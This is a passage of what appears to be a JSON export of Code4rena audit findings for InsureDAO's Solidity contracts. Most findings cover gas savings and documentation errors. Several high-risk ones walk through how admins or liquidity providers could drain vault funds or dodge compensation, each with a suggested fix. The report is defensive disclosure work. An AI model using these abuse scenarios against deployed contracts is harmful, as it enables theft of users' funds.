costs from this: ```solidity   uint256 _debt = debts[_target];   if (_debt >= _amount) {       debts[_target] -= _amount;       totalDebt -= _amount;       IERC20(token).safeTransferFrom(msg.sender, address(this), _amount);   } else {       debts[_target] = 0;       totalDebt -= _debt;       IERC20(token).safeTransferFrom(msg.sender, address(this), _debt);   } ``` to this: ```solidity   uint256 _debt = debts[_target];   if (_debt > _amount) {       debts[_target] = _debt - _amount;   } else {       debts[_target] = 0;       _amount = _debt;   }   totalDebt -= _amount;   IERC20(token).safeTransferFrom(msg.sender, address(this), _amount); ```  "}, {"title": "Repeated storage reads", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/306", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact Repeated storage read should be cached, e.g. attributions[_target] is read from storage twice: ```solidity         if (attributions[_target] > 0) {             return (valueAll() * attributions[_target]) / totalAttributions; ``` totalAttributions read twice: ```solidity         if (totalAttributions > 0 && _attribution > 0) {             return (_attribution * valueAll()) / totalAttributions; ``` available() called twice: ```solidity         if (available() < _retVal) {             uint256 _shortage = _retVal - available(); ``` would be cheaper to use _token from memory here: ```solidity     IERC20(token).safeTransfer(_to, _redundant); ```  There are more places where this optimization could be applied besides the provided examples, but the basic idea is to cache storage variables if you need to access them multiple times when the value does not change.  "}, {"title": "Repeated external calls", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/304", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact Avoid repeated external calls, e.g. here token balanceOf is queried 4 times: ```solidity if (     ...     balance < IERC20(token).balanceOf(address(this)) ) {     uint256 _redundant = IERC20(token).balanceOf(address(this)) - balance;     ... } else if (IERC20(_token).balanceOf(address(this)) > 0) {     IERC20(_token).safeTransfer(         _to,         IERC20(_token).balanceOf(address(this))     ); } ``` You should query it only once and then use the cached value as it doesn't change between the statements.  "}, {"title": "Eliminate else block", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/303", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact You dont need this else block, code can be refactored from this: ```solidity   if (address(controller) != address(0)) {       controller.migrate(address(_controller));       controller = IController(_controller);   } else {       controller = IController(_controller);   } ``` to this: ```solidity   if (address(controller) != address(0)) {       controller.migrate(address(_controller));   }   controller = IController(_controller); ```  "}, {"title": "Gas: Cache `totalLiquidity()` in `IndexTemplate:leverage()`", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/301", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact SLOADs are expensive  ## Proof of Concept Here, `totalLiquidity()` is loaded twice from storage ``` 491:     function leverage() public view returns (uint256 _rate) { 492:         //check current leverage rate 493:         if (totalLiquidity() > 0) { 494:             return (totalAllocatedCredit * MAGIC_SCALE_1E6) / totalLiquidity(); 495:         } else { 496:             return 0; 497:         } 498:     } ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Cache `totalLiquidity()` in a variable  "}, {"title": "Gas: Optimize Conditional Statements in `IndexTemplate.sol:deposit()`", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/300", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact It's possible to save gas by optimizing the checks in conditional statements (`if`, `else if` and `else`). This would save a few opcodes and avoid redundant checks.  ## Proof of Concept In `IndexTemplate.sol:deposit()`, the code is as follows: ``` 172:         if (_supply > 0 && _totalLiquidity > 0) {   173:             _mintAmount = (_amount * _supply) / _totalLiquidity; 174:         } else if (_supply > 0 && _totalLiquidity == 0) { 175:             //when 176:             _mintAmount = _amount * _supply; 177:         } else { 178:             _mintAmount = _amount; 179:         } ```  The conditions checks can be optimized with the following (read the `@audit-info` comments for further information): ```       if (_supply == 0) {           _mintAmount = _amount;       } else if (_totalLiquidity == 0) { // @audit-info : implicit _supply > 0 as above condition is false           _mintAmount = _amount * _supply;       } else { // @audit-info : implicit _supply > 0 and _totalLiquidity > 0 as both the previous conditions are false           _mintAmount = (_amount * _supply) / _totalLiquidity;       } ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Compact conditions in mentioned logic statements   "}, {"title": "`Factory:approveTemplate` could make 1 SSTORE instead of 3", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/298", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact Increased gas cost as SSTOREs are very expensive  ## Proof of Concept The code is as follows : ``` 094:     function approveTemplate( 095:         IUniversalMarket _template, 096:         bool _approval, 097:         bool _isOpen, 098:         bool _duplicate 099:     ) external override onlyOwner { 100:         require(address(_template) != address(0)); 101:         templates[address(_template)].approval = _approval; //@audit-info SSTORE 102:         templates[address(_template)].isOpen = _isOpen; //@audit-info SSTORE 103:         templates[address(_template)].allowDuplicate = _duplicate; //@audit-info SSTORE 104:         emit TemplateApproval(_template, _approval, _isOpen, _duplicate); 105:     } ``` As we can see, it's making 3 SSTORE operations, one for each boolean. The code could be optimized as follows to save gas : ```     function approveTemplate(         IUniversalMarket _template,         bool _approval,         bool _isOpen,         bool _duplicate     ) external override onlyOwner {         require(address(_template) != address(0));         Template memory approvedTemplate = new Template(_isOpen, _approval, _duplicate);         templates[address(_template)] = approvedTemplate; //@audit-info only one SSTORE         emit TemplateApproval(_template, _approval, _isOpen, _duplicate);     } ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Use a memory `Template ` struct and write in storage only once  "}, {"title": "Spec error on function: `Factory:setCondition` (difference with code comment)", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/297", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  The spec says the function should be called `approveCondition()` instead of `setCondition`: https://insuredao.gitbook.io/developers/market/factory#approvecondition  While this might still be understood nonetheless as `setCondition` is also mentioned, the spec says that the parameter `_slot` is the `index of the reference array`, whereas the code comment says it's the `index within condition array`: https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Factory.sol#L133  ## Tools Used VS Code  ## Recommended Mitigation Steps My guess is that the spec should be corrected  "}, {"title": "Spec error on function: `Factory:approveTemplate`", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/296", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  The spec doesn't match with the comments in the code here:   Code: https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Factory.sol#L90-L91 Spec: https://insuredao.gitbook.io/developers/market/factory#approvetemplate  Here, the spec doesn't mention `_isOpen` and seem to confuse the `_approval` description with what `_isOpen` should be.  ## Tools Used VS Code  ## Recommended Mitigation Steps My guess is that the spec should be corrected  "}, {"title": "`requestWithdraw` without obligation to withdraw allow underwriter to avoid payout", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/295", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged"], "target": "2022-01-insure-findings", "body": "`requestWithdraw` without obligation to withdraw allow underwriter to avoid payout"}, {"title": "Inconsistent divide by 0 checks for `totalSupply()`", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/287", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact A division by 0 could occur  ## Proof of Concept While at some places, a check is made to make sure that `totalSupply() > 0`, it's not consistently the case, such as in the following places:  ``` contracts\\CDSTemplate.sol:235:        _retVal = (vault.attributionValue(crowdPool) * _amount) / totalSupply(); contracts\\CDSTemplate.sol:318:                _balance * vault.attributionValue(crowdPool) / totalSupply(); contracts\\IndexTemplate.sol:216:        _retVal = (_liquidty * _amount) / totalSupply(); contracts\\IndexTemplate.sol:530:            return (_balance * totalLiquidity()) / totalSupply(); contracts\\PoolTemplate.sol:768:            return (_balance * originalLiquidity()) / totalSupply(); ```  At the following places, the check is indeed made: ``` contracts\\IndexTemplate.sol:514:            return (totalLiquidity() * MAGIC_SCALE_1E6) / totalSupply(); contracts\\PoolTemplate.sol:747:            return (originalLiquidity() * MAGIC_SCALE_1E6) / totalSupply(); ```  ## Tools Used VS Code  ## Recommended Mitigation Steps If this check is at least made at some places, this means that `totalSupply()` can indeed take a value of 0. Therefore, a check should always be made to prevent the div by 0  "}, {"title": "Gas: Optimize Conditional Statements in `CDSTemplate.sol:deposit()`", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/285", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact It's possible to save gas by optimizing the checks in conditional statements (`if`, `else if` and `else`). This would save a few opcodes and avoid redundant checks.  ## Proof of Concept In `CDSTemplate.sol:deposit()`, the code is as follows: ``` 140:         if (_supply > 0 && _liquidity > 0) {  141:             _mintAmount = (_amount * _supply) / _liquidity; 142:         } else if (_supply > 0 && _liquidity == 0) { 143:             //when vault lose all underwritten asset =  144:             _mintAmount = _amount * _supply; //dilute LP token value af. Start CDS again. 145:         } else { 146:             //when _supply == 0, 147:             _mintAmount = _amount; 148:         } ```  The conditions checks can be optimized with the following (read the `@audit-info` comments for futher information): ```         if (_supply == 0) {              _mintAmount = _amount;         } else if (_liquidity == 0) { // @audit-info : implicit _supply > 0 as above condition is false             //when vault lose all underwritten asset =              _mintAmount = _amount * _supply; //dilute LP token value af. Start CDS again.         } else { // @audit-info : implicit _supply > 0 and _liquidity > 0 as both the previous conditions are false             _mintAmount = (_amount * _supply) / _liquidity;         } ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Compact conditions in mentioned logic statements  "}, {"title": "Wrong comment on fund function", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/284", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Fitraldys   # Vulnerability details  ## Impact In the https://github.com/code-423n4/2022-01-insure/blob/main/contracts/CDSTemplate.sol#L157 it is the descriptionof the depoist function, and not the correct description for the fund function.  ## Proof of Concept https://github.com/code-423n4/2022-01-insure/blob/main/contracts/CDSTemplate.sol#L156-L173    "}, {"title": "[WP-H39] `PoolTemplate.sol#resume()` Wrong implementation of `resume()` will compensate overmuch redeem amount from index pools", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/283", "labels": ["bug", "3 (High Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  WatchPug   # Vulnerability details  ## Root Cause  Wrong arithmetic.  ---  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/PoolTemplate.sol#L700-L717  ```solidity uint256 _deductionFromIndex = (_debt * _totalCredit * MAGIC_SCALE_1E6) /             totalLiquidity();     uint256 _actualDeduction;     for (uint256 i = 0; i < indexList.length; i++) {         address _index = indexList[i];         uint256 _credit = indicies[_index].credit;         if (_credit > 0) {             uint256 _shareOfIndex = (_credit * MAGIC_SCALE_1E6) /                 _totalCredit;             uint256 _redeemAmount = _divCeil(                 _deductionFromIndex,                 _shareOfIndex             );             _actualDeduction += IIndexTemplate(_index).compensate(                 _redeemAmount             );         }     } ```   ### PoC  - totalLiquidity = 200,000* 10**18; - totalCredit = 100,000 * 10**18; - debt = 10,000 * 10**18;  - [Index Pool 1] Credit = 20,000 * 10**18; - [Index Pool 2] Credit = 30,000 * 10**18;  ``` uint256 _deductionFromIndex = (_debt * _totalCredit * MAGIC_SCALE_1E6) /             totalLiquidity(); // _deductionFromIndex = 10,000 * 10**6 * 10**18;  ```  [Index Pool 1]:  ``` uint256 _shareOfIndex = (_credit * MAGIC_SCALE_1E6) / _totalCredit;   //  _shareOfIndex = 200000  uint256 _redeemAmount = _divCeil(     _deductionFromIndex,     _shareOfIndex );  // _redeemAmount = 25,000 * 10**18; ```  [Index Pool 2]:  ``` uint256 _shareOfIndex = (_credit * MAGIC_SCALE_1E6) / _totalCredit;   //  _shareOfIndex = 300000  uint256 _redeemAmount = _divCeil(     _deductionFromIndex,     _shareOfIndex );  // _redeemAmount = 16666666666666666666667 (~ 16,666 * 10**18) ```  In most cases, the transaction will revet on underflow at: ``` uint256 _shortage = _deductionFromIndex /             MAGIC_SCALE_1E6 -             _actualDeduction; ```  In some cases, specific pools will be liable for unfair compensation:  If the CSD is empty, `Index Pool 1` only have `6,000 * 10**18` and `Index Pool 2` only have `4,000 * 10**18`, the `_actualDeduction` will be `10,000 * 10**18`, `_deductionFromPool` will be `0`.   `Index Pool 1` should only pay `1,000 * 10**18`, but actually paid `6,000 * 10**18`, the LPs of `Index Pool 1` now suffer funds loss.  ### Recommendation  Change to:  ```solidity uint256 _deductionFromIndex = (_debt * _totalCredit * MAGIC_SCALE_1E6) / totalLiquidity(); uint256 _actualDeduction; for (uint256 i = 0; i < indexList.length; i++) {     address _index = indexList[i];     uint256 _credit = indicies[_index].credit;     if (_credit > 0) {         uint256 _shareOfIndex = (_credit * MAGIC_SCALE_1E6) /             _totalCredit;         uint256 _redeemAmount = _divCeil(             _deductionFromIndex * _shareOfIndex,             MAGIC_SCALE_1E6 * MAGIC_SCALE_1E6         );         _actualDeduction += IIndexTemplate(_index).compensate(             _redeemAmount         );     } } ```  "}, {"title": "[WP-G37] Change `public` constant variables to `private` / `internal` can save gas", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/282", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/PoolTemplate.sol#L146-L146  ```solidity uint256 public constant MAGIC_SCALE_1E6 = 1e6; //internal multiplication scale 1e6 to reduce decimal truncation ```  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/IndexTemplate.sol#L95-L95  ```solidity uint256 public constant MAGIC_SCALE_1E6 = 1e6; //internal multiplication scale 1e6 to reduce decimal truncation ```   https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/CDSTemplate.sol#L55-L55  ```solidity uint256 public constant MAGIC_SCALE_1E6 = 1e6; //internal multiplication scale 1e6 to reduce decimal truncation ```   https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L38-L38  ```solidity uint256 public constant MAGIC_SCALE_1E6 = 1e6; //internal multiplication scale 1e6 to reduce decimal truncation ```  For the constants that should not be `public`, changing them to `private` / `internal` can save some gas. To avoid unnecessary getter functions.  "}, {"title": "[WP-H36] Admin of the index pool can `withdrawCredit()` after `applyCover()` to avoid taking loss for the compensation paid for a certain pool", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/281", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  WatchPug   # Vulnerability details  In the current implementation, when an incident is reported for a certain pool, the index pool can still `withdrawCredit()` from the pool, which in the best interest of an index pool, the admin of the index pool is preferred to do so.  This allows the index pool to escape from the responsibility for the risks of invested pools.  Making the LPs of the pool take an unfair share of the responsibility.  ### PoC  - Pool A `totalCredit` = 10,000 - Pool A `rewardPerCredit` = 1  1. [Index Pool 1] allocates 1,000 credits to Pool `A`:  - `totalCredit` = 11,000 - indicies[Index Pool 1] = 1,000  2. After a while, Pool A `rewardPerCredit` has grown to `1.1`, and `applyCover()` has been called, [Index Pool 1] call `withdrawCredit()` get 100 premium  - `totalCredit` = 10,000 - indicies[Index Pool 1] = 0  3. After `pendingEnd`, the pool `resume()`,[ Index Pool 1] will not be paying for the compensation since `credit` is 0.  In our case, [Index Pool 1] earned premium without paying for a part of the compensation.  ### Recommendation  Change to:  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/PoolTemplate.sol#L416-L421  ```solidity     function withdrawCredit(uint256 _credit)         external         override         returns (uint256 _pending)     {         require(             marketStatus == MarketStatus.Trading,             \"ERROR: WITHDRAW_CREDIT_BAD_CONDITIONS\"         );         IndexInfo storage _index = indicies[msg.sender]; ```  "}, {"title": "[WP-H33] `IndexTemplate.sol` Wrong implementation allows lp of the index pool to resume a locked `PayingOut` pool and escape the responsibility for the compensation", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/278", "labels": ["bug", "3 (High Risk)"], "target": "2022-01-insure-findings", "body": "[WP-H33] `IndexTemplate.sol` Wrong implementation allows lp of the index pool to resume a locked `PayingOut` pool and escape the responsibility for the compensation"}, {"title": "using operator `&&` used more gas", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/274", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-01-insure-findings", "body": "using operator `&&` used more gas"}, {"title": "[WP-H30] A malicious/compromised Registry or Factory admin can drain all the funds from the Vault contracts", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/272", "labels": ["bug", "3 (High Risk)", "disagree with severity", "sponsor acknowledged"], "target": "2022-01-insure-findings", "body": "[WP-H30] A malicious/compromised Registry or Factory admin can drain all the funds from the Vault contracts"}, {"title": "[WP-H29] `Vault#setController()` owner of the Vault contracts can drain funds from the Vault", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/271", "labels": ["bug", "3 (High Risk)", "disagree with severity", "sponsor acknowledged"], "target": "2022-01-insure-findings", "body": "[WP-H29] `Vault#setController()` owner of the Vault contracts can drain funds from the Vault"}, {"title": "[WP-L28] `Vault#_unutilize()` Lack of validation for the amount of funds received", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/270", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L429-L434  ```solidity function _unutilize(uint256 _amount) internal {     require(address(controller) != address(0), \"ERROR_CONTROLLER_NOT_SET\");      controller.withdraw(address(this), _amount);     balance += _amount; } ```  ### Recommendation  Can be changed to:  ```solidity function _unutilize(uint256 _amount) internal {     require(address(controller) != address(0), \"ERROR_CONTROLLER_NOT_SET\");      uint256 beforeBalance = IERC20(token).balanceOf(address(this));     controller.withdraw(address(this), _amount);     uint256 received = IERC20(token).balanceOf(address(this)) - beforeBalance;     require(received >= _amount, \"...\");     balance += received; } ```   "}, {"title": "[WP-H27] `IndexTemplate.sol#compensate()` will most certainly fail", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/269", "labels": ["bug", "3 (High Risk)", "disagree with severity", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  WatchPug   # Vulnerability details  ## Root Cause  Precision loss while converting between `the amount of shares` and `the amount of underlying tokens` back and forth is not handled properly.  ---  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/IndexTemplate.sol#L438-L447  ```solidity uint256 _shortage; if (totalLiquidity() < _amount) {     //Insolvency case     _shortage = _amount - _value;     uint256 _cds = ICDSTemplate(registry.getCDS(address(this)))         .compensate(_shortage);     _compensated = _value + _cds; } vault.offsetDebt(_compensated, msg.sender); ```  In the current implementation, when someone tries to resume the market after a pending period ends by calling `PoolTemplate.sol#resume()`, `IndexTemplate.sol#compensate()` will be called internally to make a payout. If the index pool is unable to cover the compensation, the CDS pool will then be used to cover the shortage.  However, while `CDSTemplate.sol#compensate()` takes a parameter for the amount of underlying tokens, it uses `vault.transferValue()` to transfer corresponding `_attributions` (shares) instead of underlying tokens.  Due to precision loss, the `_attributions` transferred in the terms of underlying tokens will most certainly be less than the shortage.  At L444, the contract believes that it's been compensated for `_value + _cds`, which is lower than the actual value, due to precision loss.  At L446, when it calls `vault.offsetDebt(_compensated, msg.sender)`, the tx will revert at `require(underlyingValue(msg.sender) >= _amount)`.  As a result, `resume()` can not be done, and the debt can't be repaid.  ### PoC   Given:  - vault.underlyingValue = 10,000 - vault.valueAll = 30,000 - totalAttributions = 2,000,000 - _amount = 1,010,000  0. _shortage = _amount - vault.underlyingValue = 1,000,000 1. _attributions = (_amount * totalAttributions) / valueAll = 67,333,333 2. actualValueTransfered = (valueAll * _attributions) / totalAttributions = 1009999  **Expected results**: actualValueTransfered = _shortage;  **Actual results**: actualValueTransfered < _shortage.  ## Impact  The precision loss isn't just happening on special numbers, but will most certainly always revert the txs.  This will malfunction the contract as the index pool can not `compensate()`, therefore the pool can not `resume()`. Causing the funds of the LPs of the pool and the index pool to be frozen, and other stakeholders of the same vault will suffer fund loss from an unfair share of the funds compensated before.  ## Recommendation  Change to:  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/IndexTemplate.sol#L439-L446  ```solidity if (totalLiquidity() < _amount) {     //Insolvency case     _shortage = _amount - _value;     uint256 _cds = ICDSTemplate(registry.getCDS(address(this)))         .compensate(_shortage);     _compensated = vault.underlyingValue(address(this)); } vault.offsetDebt(_compensated, msg.sender); ```  "}, {"title": "[WP-L26] `Vault#setController()` Lack of validation for the amount of migrated funds", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/268", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L485-L496  ```solidity function setController(address _controller) public override onlyOwner {     require(_controller != address(0), \"ERROR_ZERO_ADDRESS\");      if (address(controller) != address(0)) {         controller.migrate(address(_controller));         controller = IController(_controller);     } else {         controller = IController(_controller);     }      emit ControllerSet(_controller); } ```  `controller.migrate()` is a critical operation, we recommend adding validation for the amount of migrated funds.  ### Recommendation  Can be changed to:  ```solidity function setController(address _controller) public override onlyOwner {     require(_controller != address(0), \"ERROR_ZERO_ADDRESS\");      if (address(controller) != address(0)) {         uint256 beforeUnderlying = controller.valueAll();         controller.migrate(address(_controller));         require(IController(_controller).valueAll() >= beforeUnderlying, \"...\");         controller = IController(_controller);     } else {         controller = IController(_controller);     }      emit ControllerSet(_controller); } ```  "}, {"title": "[WP-H24] Wrong design/implementation of permission control allows malicious/compromised Registry or Factory admin to steal funds from users' wallet balances", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/266", "labels": ["bug", "3 (High Risk)", "disagree with severity", "sponsor acknowledged"], "target": "2022-01-insure-findings", "body": "[WP-H24] Wrong design/implementation of permission control allows malicious/compromised Registry or Factory admin to steal funds from users' wallet balances"}, {"title": "[WP-G23] Avoiding unnecessary storage read can save gas", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/265", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Ownership.sol#L17-L20  ```solidity constructor() {     _owner = msg.sender;     emit AcceptNewOwnership(_owner); } ```  At L19, the parameter of `AcceptNewOwnership` can use `msg.sender` directly to avoid unnecessary storage read of `_owner` to save some gas.  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Ownership.sol#L65-L71  ```solidity function acceptTransferOwnership() external override onlyFutureOwner {     /***         *@notice Accept a transfer of ownership         */     _owner = _futureOwner;     emit AcceptNewOwnership(_owner); } ```  At L69, `_futureOwner` can use `msg.sender` directly to avoid unnecessary storage read of `_futureOwner` to save some gas.  As `onlyFutureOwner()` ensures that `require(_futureOwner == msg.sender, \"...\");`.  "}, {"title": "[WP-G21] Cache external call results can save gas", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/264", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  WatchPug   # Vulnerability details  Every call to an external contract costs a decent amount of gas. For optimization of gas usage, external call results should be cached if they are being used for more than one time.  For example:  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L153-L158  ```solidity require(     attributions[msg.sender] > 0 &&         underlyingValue(msg.sender) >= _amount,     \"ERROR_WITHDRAW-VALUE_BADCONDITOONS\" ); _attributions = (totalAttributions * _amount) / valueAll(); ```  In `Vault#withdrawValue()`, `controller.valueAll()` is called twice:  1. L155 `underlyingValue(msg.sender)` -> `valueAll()` -> `controller.valueAll()`; 1. L158 `valueAll()` ->  `controller.valueAll()`.  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L400-L411  ```solidity function underlyingValue(address _target)     public     view     override     returns (uint256) {     if (attributions[_target] > 0) {         return (valueAll() * attributions[_target]) / totalAttributions;     } else {         return 0;     } } ```  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L417-L423  ```solidity function valueAll() public view returns (uint256) {     if (address(controller) != address(0)) {         return balance + controller.valueAll();     } else {         return balance;     } } ```  "}, {"title": "the first depositor to a pool can drain all users", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/263", "labels": ["bug", "3 (High Risk)", "disagree with severity", "sponsor acknowledged"], "target": "2022-01-insure-findings", "body": "the first depositor to a pool can drain all users"}, {"title": "PoolTemplate.availableBalance calls totalLiquidity twice", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/262", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  hyh   # Vulnerability details  ## Impact  Gas is overspent on the function call  ## Proof of Concept  availableBalance calls totalLiquidity() twice:  https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L835  ## Recommended Mitigation Steps  Save the call result to memory and use it  "}, {"title": "Keeper, not controller: Vault.setKeeper and utilize descriptions are incorrect", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/259", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  hyh   # Vulnerability details    ## Impact  `setKeeper` / `utilize` descriptions state that it is controller who is set / can run utilize, while keeper and controller are two separate roles, which don't have to coincide.  I.e. the descriptions now mix up the roles and are confusing this way.  ## Proof of Concept  setKeeper:  https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Vault.sol#L499   utilize:  https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Vault.sol#L339   ## Recommended Mitigation Steps  Update the descriptions to relate to the `keeper` role.   "}, {"title": "Struct layout", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/253", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Jujic   # Vulnerability details  ## Impact Insurance struct in `PoolTemplate .sol` can be optimized to reduce 2 storage slot  ## Proof of Concept https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/PoolTemplate.sol#L127-L128 ``` struct Insurance {         uint256 id; //each insuance has their own id         uint256 startTime; //timestamp of starttime         uint256 endTime; //timestamp of endtime         uint256 amount; //insured amount         bytes32 target; //target id in bytes32         address insured; //the address holds the right to get insured         bool status; //true if insurance is not expired or redeemed     } ``` `startTime` and `endTime `store block numbers, and 2^48 is being enough for a very long time. ## Tools Used https://docs.soliditylang.org/en/v0.8.0/internals/layout_in_storage.html?highlight=Structs#layout-of-state-variables-in-storage   ## Recommended Mitigation Steps The struct can be changed into: ``` struct Insurance {         uint256 id; //each insuance has their own id         uint48 startTime; //timestamp of starttime         uint48 endTime; //timestamp of endtime         address insured; //the address holds the right to get insured         uint256 amount; //insured amount         bytes32 target; //target id in bytes32         bool status; //true if insurance is not expired or redeemed     } ```   "}, {"title": "backdoor in `withdrawRedundant`", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/252", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  cmichel   # Vulnerability details  The `Vault.withdrawRedundant` has wrong logic that allows the admins to steal the underlying vault token.  ```solidity function withdrawRedundant(address _token, address _to)      external      override      onlyOwner {      if (           _token == address(token) &&           balance < IERC20(token).balanceOf(address(this))      ) {           uint256 _redundant = IERC20(token).balanceOf(address(this)) -                balance;           IERC20(token).safeTransfer(_to, _redundant);      } else if (IERC20(_token).balanceOf(address(this)) > 0) {           // @audit they can rug users. let's say balance == IERC20(token).balanceOf(address(this)) => first if false => transfers out everything           IERC20(_token).safeTransfer(                _to,                IERC20(_token).balanceOf(address(this))           );      } } ```  #### POC - Vault deposits increase as `Vault.addValue` is called and the `balance` increases by `_amount` as well as the actual `IERC20(token).balanceOf(this)`. Note that `balance == IERC20(token).balanceOf(this)` - Admins call `vault.withdrawRedundant(vault.token(), attacker)` which goes into the `else if` branch due to the balance 